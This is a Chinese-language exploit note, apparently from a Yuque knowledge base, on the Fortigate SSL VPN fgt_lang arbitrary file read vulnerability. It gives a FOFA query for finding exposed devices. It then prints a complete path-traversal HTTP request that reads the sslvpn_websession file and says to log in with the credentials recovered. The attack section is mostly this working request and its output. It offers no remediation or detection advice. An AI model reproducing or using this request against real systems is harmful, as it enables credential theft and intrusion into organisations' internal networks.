# Fortigate SSL VPN fgt_lang存在任意文件读取漏洞

# 一、漏洞简介
飞塔防火墙设备的专用名词，Fortinet是飞塔的品牌，而FortiGate 是指飞塔硬件。Fortinet的屡获殊荣的FortiGate系列，是采用ASIC加速的UTM解决方案，可以有效地防御网络层和内容层的攻击。Fortinet将其SSL VPN产品线称为Fortigate SSL VPN,主要应用于最终用户以及中型企业。目前互联网上这些服务器的数量已超过48万台,主要集中在亚洲及欧洲区域。FortinetSSL VPN系统存在任意文件读取漏洞，攻击者通过漏洞可以通过VPN进入内网，导致内网失陷。

# 二、影响版本
+ Fortigate SSL VPN

# 三、资产测绘
+ fofa`app="FORTINET-SSLVPN"`
+ 特征

![1708092353453-aa4ebd52-c568-4244-9a91-8c5c81c9e9ec.png](./img/E8qdadyp9jQpN2G8/1708092353453-aa4ebd52-c568-4244-9a91-8c5c81c9e9ec-894218.png)

# 四、漏洞复现
```java
GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

![1708092406691-a59dc5bf-81c2-4ef9-8253-ee3897ec4f44.png](./img/E8qdadyp9jQpN2G8/1708092406691-a59dc5bf-81c2-4ef9-8253-ee3897ec4f44-016213.png)

<font style="color:rgb(34, 34, 34);">根据账号密码登录即可</font>

![1708092442244-dbe869e6-9452-46df-a907-52a65b5f547f.png](./img/E8qdadyp9jQpN2G8/1708092442244-dbe869e6-9452-46df-a907-52a65b5f547f-370030.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewnsxk842voyxx9o>